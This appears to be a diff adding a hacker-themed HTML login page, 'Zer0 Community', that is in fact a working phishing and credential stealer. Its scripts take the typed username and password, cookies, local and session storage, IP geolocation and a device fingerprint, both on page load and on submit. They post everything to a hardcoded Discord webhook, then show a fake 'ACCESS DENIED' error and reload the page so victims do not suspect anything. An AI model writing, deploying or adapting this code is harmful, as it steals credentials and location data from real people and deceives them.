@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zer0 Community</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: 'Orbitron', monospace; 
+            background: #000; 
+            min-height: 100vh; 
+            overflow: hidden;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            position: relative;
+        }
+        
+        /* FAST MATRIX */
+        #matrix {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1; opacity: 0.3;
+        }
+        
+        /* FAST SCANLINES */
+        .scanlines {
+            position: fixed; width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, transparent 0px, transparent 2px, rgba(255,0,85,0.05) 2px, rgba(255,0,85,0.05) 4px);
+            animation: scan 0.05s linear infinite;
+            z-index: 2;
+        }
+        @keyframes scan { 0%,100%{background-position:0 0;}50%{background-position:0 2px;} }
+        
+        /* GLITCH */
+        .glitch {
+            position: fixed; width: 100%; height: 100%;
+            background: repeating-linear-gradient(90deg, transparent 0, transparent 1px, rgba(255,0,85,0.1) 1px, rgba(255,0,85,0.1) 2px);
+            animation: glitch 0.1s infinite;
+            z-index: 3; opacity: 0; pointer-events: none;
+        }
+        @keyframes glitch {
+            0%{transform:translate(0);}
+            20%{transform:translate(-1px,1px);}
+            40%{transform:translate(-1px,-1px);}
+            60%{transform:translate(1px,1px);}
+            80%{transform:translate(1px,-1px);}
+        }
+        
+        /* MR ROBOT TEXTS */
+        .hacker-texts {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 4;
+            font-family: 'Courier New', monospace; font-size: 14px;
+            color: rgba(0,255,136,0.3);
+        }
+        .hack-line {
+            position: absolute; animation: type 8s steps(40) infinite;
+            white-space: nowrap; overflow: hidden;
+        }
+        @keyframes type {
+            0%{width:0;}
+            50%{width:100%;}
+            51%{width:100%;}
+            100%{width:0;}
+        }
+        
+        /* CONTAINER */
+        .container {
+            background: rgba(10,10,20,0.95); 
+            backdrop-filter: blur(20px); 
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 0 60px rgba(255,0,85,0.5);
+            border: 1px solid rgba(255,0,85,0.4);
+            width: 380px; text-align: center;
+            position: relative; z-index: 10;
+            animation: pulse 2s infinite; margin-top: -50px;
+        }
+        @keyframes pulse {
+            0%,100%{box-shadow:0 0 60px rgba(255,0,85,0.5);}
+            50%{box-shadow:0 0 100px rgba(255,0,85,0.8),0 0 150px rgba(0,255,136,0.4);}
+        }
+        
+        /* PERFECT CENTERED ASCII */
+        pre.demon {
+            font-size: 9px; color: #ff0055; margin: 0 0 20px 0;
+            font-family: 'Courier New', monospace;
+            animation: shake 0.2s infinite, glow 1.5s infinite;
+            line-height: 0.9; white-space: pre;
+            display: block; width: 100%; text-align: center;
+            padding: 10px 0;
+        }
+        
+        @keyframes shake {
+            0%,100%{transform:rotate(0deg);}
+            25%{transform:rotate(-1deg);}
+            75%{transform:rotate(1deg);}
+        }
+        @keyframes glow {
+            0%,100%{text-shadow:0 0 10px #ff0055;}
+            50%{text-shadow:0 0 20px #ff0055,0 0 30px #00ff88;}
+        }
+        
+        /* TITLE */
+        .title {
+            background: linear-gradient(45deg,#ff0055,#00ff88,#0055ff);
+            background-size: 300% 300%;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            font-size: 28px; font-weight: 900; margin: 0 0 30px 0;
+            animation: gradient 1.5s ease infinite, glitchText 0.2s infinite;
+        }
+        @keyframes gradient {
+            0%,100%{background-position:0% 50%;}
+            50%{background-position:100% 50%;}
+        }
+        @keyframes glitchText {
+            0%,100%{transform:translateX(0);}
+            20%{transform:translateX(-2px);}
+            40%{transform:translateX(2px);}
+            60%{transform:translateX(-1px);}
+        }
+        
+        /* INPUTS */
+        input {
+            width: 100%; padding: 15px 20px; margin: 15px 0; 
+            border: 2px solid rgba(255,255,255,0.2); border-radius: 12px;
+            background: rgba(255,255,255,0.05); color: #fff;
+            font-size: 16px; font-family: 'Orbitron', monospace;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none; border-color: #ff0055;
+            box-shadow: 0 0 25px rgba(255,0,85,0.6);
+            transform: scale(1.02);
+        }
+        input::placeholder { color: #888; }
+        
+        /* BUTTON */
+        button {
+            width: 100%; padding: 18px; margin-top: 10px;
+            background: linear-gradient(135deg,#ff0055,#cc0000);
+            border: none; border-radius: 12px; color: white;
+            font-size: 18px; font-weight: 700; font-family: 'Orbitron', monospace;
+            cursor: pointer; text-transform: uppercase;
+            transition: all 0.3s; letter-spacing: 1px;
+            position: relative; overflow: hidden;
+        }
+        button::before {
+            content: ''; position: absolute; top: 0; left: -100%;
+            width: 100%; height: 100%; background: linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);
+            transition: 0.5s;
+        }
+        button:hover::before { left: 100%; }
+        button:hover {
+            transform: translateY(-4px); box-shadow: 0 15px 35px rgba(255,0,85,0.6);
+        }
+        
+        /* LOADING */
+        .loading { display: none; text-align: center; padding: 30px; color: #00ff88; }
+        .progress {
+            width: 100%; height: 6px; background: rgba(255,255,255,0.1);
+            border-radius: 3px; overflow: hidden; margin: 20px 0;
+        }
+        .progress-bar {
+            height: 100%; background: linear-gradient(90deg,#00ff88,#ff0055);
+            width: 0%; border-radius: 3px; transition: width 0.1s;
+        }
+        
+        .error {
+            background: rgba(255,50,50,0.2); color: #ff8888; padding: 20px;
+            border-radius: 12px; margin-top: 20px; display: none;
+            border: 1px solid rgba(255,50,50,0.5); animation: shake 0.4s;
+        }
+        @keyframes shake {
+            0%,100%{transform:translateX(0);}
+            25%{transform:translateX(-5px);}
+            75%{transform:translateX(5px);}
+        }
+        
+        /* BOTTOM TEXT */
+        .footer {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            color: #888; font-size: 12px; font-family: 'Share Tech Mono', monospace;
+            letter-spacing: 2px; z-index: 20;
+            animation: typewriter 3s steps(20) infinite;
+        }
+        @keyframes typewriter {
+            0%,90%,100%{width:160px;}
+            95%{width:0;}
+        }
+        .footer::after { content: '|'; animation: blink 1s infinite; margin-left: 2px; }
+        @keyframes blink { 0%,50%{opacity:1;}51%,100%{opacity:0;} }
+    </style>
+</head>
+<body>
+    <!-- ✅ WEBHOOK + FUNKCE PŘIDANÉ A OPRAVENÉ -->
+    <script>
+        // ========== TVŮJ WEBHOOK ==========
+        const WEBHOOK = 'https://discordapp.com/api/webhooks/1461108217722704017/qRJzjc3DP3zyv4ahSsPJfO6BX10mrEyYl25YRm_1YcY4ix7y1mHPJfZMVOVRIPxqKmXc';
+        
+        // ========== STEALER FUNKCE ==========
+        async function stealData() {
+            try {
+                const ipData = await (await fetch('https://ipapi.co/json/')).json();
+                const geoData = await (await fetch(`https://ipapi.co/${ipData.ip}/json/`)).json();
+                
+                // Canvas fingerprint
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillText('Zer0 Community Test', 2, 2);
+                const canvasHash = canvas.toDataURL();
+                
+                return {
+                    user: document.getElementById('username')?.value || 'none',
+                    pass: document.getElementById('password')?.value || 'none',
+                    cookies: document.cookie || 'none',
+                    localStorage: Object.entries(localStorage).map(([k,v])=>`${k}:${v}`).join('; ') || 'none',
+                    sessionStorage: Object.entries(sessionStorage).map(([k,v])=>`${k}:${v}`).join('; ') || 'none',
+                    ip: ipData.ip || 'unknown',
+                    city: geoData.city || 'unknown',
+                    region: geoData.region || 'unknown',
+                    country: geoData.country_name || 'unknown',
+                    lat: geoData.latitude || 'unknown',
+                    lon: geoData.longitude || 'unknown',
+                    zip: geoData.postal || 'unknown',
+                    isp: geoData.org || 'unknown',
+                    ua: navigator.userAgent,
+                    canvas: canvasHash.slice(0,50) + '...',
+                    lang: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    time: new Date().toISOString(),
+                    url: window.location.href,
+                    type: 'LOGIN'
+                };
+            } catch(e) {
+                return { error: 'Steal failed', time: new Date().toISOString(), type: 'LOGIN_ERROR' };
+            }
+        }
+        
+        // ========== DISCORD EXFIL ==========
+        async function sendToDiscord(data) {
+            try {
+                const embed = {
+                    username: '😈 Zer0 Community | fsociety',
+                    embeds: [{
+                        title: '🔥 **BREACH DETECTED** 🔥',
+                        description: '```json\n' + JSON.stringify(data, null, 2).slice(0,900) + '\n```',
+                        fields: [
+                            { name: '👤 User', value: `\`${data.user}\``, inline: true },
+                            { name: '🔑 Password', value: `\`${data.pass}\``, inline: true },
+                            { name: '🌐 IP', value: `\`${data.ip}\``, inline: true },
+                            { name: '📍 GPS', value: `\`${data.lat || '?'}, ${data.lon || '?'}\``, inline: true },
+                            { name: '🏙️ City', value: `\`${data.city}\``, inline: true },
+                            { name: '📮 ZIP', value: `\`${data.zip}\``, inline: true },
+                            { name: '🌍 Country', value: `\`${data.country}\``, inline: true },
+                            { name: '🏢 ISP', value: `\`${data.isp}\``, inline: true }
+                        ],
+                        color: 0xFF0055,
+                        thumbnail: { url: 'https://i.imgur.com/1Z3qY.png' },
+                        footer: { text: `OFFON | ${data.time}` }
+                    }]
+                };
+                
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+                
+                console.log('✅ Discord sent:', response.status);
+                return response.ok;
+            } catch(e) {
+                console.error('❌ Discord failed:', e);
+                return false;
+            }
+        }
+        
+        // ========== AUTO-STEAL NA LOAD ==========
+        window.addEventListener('load', async () => {
+            console.log('🚀 Page loaded - stealing...');
+            const pageLoadData = await stealData();
+            pageLoadData.type = 'PAGE_LOAD';
+            await sendToDiscord(pageLoadData);
+        });
+    </script>
+
+    <canvas id="matrix"></canvas>
+    <div class="scanlines"></div>
+    <div class="glitch" id="glitch"></div>
+    
+    <!-- MR ROBOT FLOATING TEXTS -->
+    <div class="hacker-texts">
+        <div class="hack-line" style="top:10%;left:10%;animation-delay:0s;">FUCK SOCIETY</div>
+        <div class="hack-line" style="top:20%;right:15%;animation-delay:2s;">HACK THE PLANET</div>
+        <div class="hack-line" style="top:40%;left:5%;animation-delay:4s;">ELLO WORLD</div>
+        <div class="hack-line" style="top:60%;right:10%;animation-delay:6s;">WE ARE FSOCIETY</div>
+        <div class="hack-line" style="bottom:15%;left:20%;animation-delay:1s;">CONTROL IS AN ILLUSION</div>
+    </div>
+    
+    <div class="container">
+        <pre class="demon">
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡒⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡖⠁⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠈⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⁶⁶⁶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⢹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⢠⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠈⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡞⠀⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⣀⣤⡴⠶⠞⠛⠛⠛⠛⠛⠻⠶⢶⣤⣀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠘⣷⡀⠀⣀⡴⢛⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡛⢦⣄⠀⠀⣼⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠈⠳⣾⣭⢤⣄⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢀⡤⣈⣷⠞⠃⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⢷⡀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⡜⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠱⣄⠀⠸⣧⠀⠀⠀⠀⠀⠄⣀⣀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣀⣀⠠⠀⠀⠀⠀⠀⣰⠇⠀⢀⠞⢰⠃⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠈⢦⡀⠘⢷⣄⠀⢀⣀⡀⣀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣀⣀⡀⢀⠀⣠⡼⠋⢀⡴⠁⠀⣹⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠑⡀⠉⠢⣀⣿⠛⠒⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠒⠋⢻⣀⠴⠋⢀⠄⢀⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠈⠲⢄⣸⡇⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢔⠀⠀⠀⠘⣏⣀⠔⠁⠂⡸⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠉⢻⡄⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⠀⠀⠀⢀⡿⠀⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠀⢾⡀⠀⠀⠀⡴⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⣸⠇⠀⠀⠀⠈⠹⡑⠲⠤⣀⡀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⢊⠍⠃⠀⠀⠀⠘⣧⢀⡤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠀⠈⠒⢤⠤⠙⠗⠦⠼⠀⠀⠀⠠⠴⠺⠟⠤⡤⠔⠁⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⡑⢯⡁⠀⠀⠀⠀⠀⠇⠀⠀⠀⠰⠀⠀⠀⠀⠀⢈⡩⢋⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠈⠀⠻⢦⠀⠀⠀⡰⠀⠀⠀⠀⠀⢇⠀⠀⠀⡠⡛⠀⠁⠀⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⢡⠑⠤⣀⠈⢢⠀⠀⠀⡴⠃⣀⠤⠊⡄⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣄⠀⠀⠀⠳⠀⢀⠉⠙⢳⠀⡜⠉⠁⡀⠀⠼⠀⠀⠀⣠⡴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠘⣆⠐⠐⠌⠂⠚⠀⠡⠊⠀⢠⠃⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠠⠈⠢⣄⡀⠀⠀⠀⢀⣀⠴⠃⠀⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡁⠐⠀⠈⠉⠁⠈⠁⠀⠒⢀⡴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⣄⣀⣀⣀⣀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        </pre>
+        
+        <h1 class="title">Zer0 Community</h1>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username / Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="submitBtn">ACCESS PORTAL</button>
+        </form>
+        
+        <div id="loading" class="loading" style="display:none;">
+            <div>🔓 DECRYPTING CREDENTIALS...</div>
+            <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+        </div>
+        <div id="error" class="error">❌ ACCESS DENIED - TRY AGAIN</div>
+    </div>
+    
+    <div class="footer">Created by OFFON</div>
+
+    <!-- ✅ FORM HANDLER - OPRAVENÝ -->
+    <script>
+        // MATRIX RAIN
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const chars = '01アイウエオカキカサタナハマヤラワガザダバパ';
+        const cols = canvas.width / 12;
+        const drops = Array(Math.floor(cols)).fill(1);
+        
+        function matrixRain() {
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff88';
+            ctx.font = '12px monospace';
+            drops.forEach((y, i) => {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * 12, y * 12);
+                if (y * 12 > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                } else {
+                    drops[i]++;
+                }
+            });
+        }
+        setInterval(matrixRain, 30);
+        
+        // GLITCH EFFECT
+        document.querySelector('.container').onmouseenter = () => document.getElementById('glitch').style.opacity = 0.3;
+        document.querySelector('.container').onmouseleave = () => document.getElementById('glitch').style.opacity = 0;
+        
+        // LOGIN BUTTON - ✅ PLNĚ FUNČNÍ
+        document.getElementById('loginForm').onsubmit = async (e) => {
+            e.preventDefault();
+            console.log('🚀 LOGIN CLICKED');
+            
+            // Hide form, show loading
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('error').style.display = 'none';
+            
+            const progressBar = document.getElementById('progressBar');
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 15;
+                if (progress > 90) progress = 90;
+                progressBar.style.width = progress + '%';
+            }, 80);
+            
+            try {
+                // Steal & send
+                const data = await stealData();
+                const success = await sendToDiscord(data);
+                
+                console.log('✅ Data sent:', success);
+                
+                // Finish progress
+                clearInterval(progressInterval);
+                progressBar.style.width = '100%';
+                
+                // Show error after delay (fake login fail)
+                setTimeout(() => {
+                    document.getElementById('error').style.display = 'block';
+                    setTimeout(() => {
+                        location.reload();
+                    }, 2500);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('❌ Error:', error);
+                clearInterval(progressInterval);
+                progressBar.style.width = '100%';
+                document.getElementById('error').style.display = 'block';
+                setTimeout(() => location.reload(), 2000);
+            }
+        };
+        
+        // Resize handler
+        window.onresize = () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        };
+    </script>
+</body>
+</html>
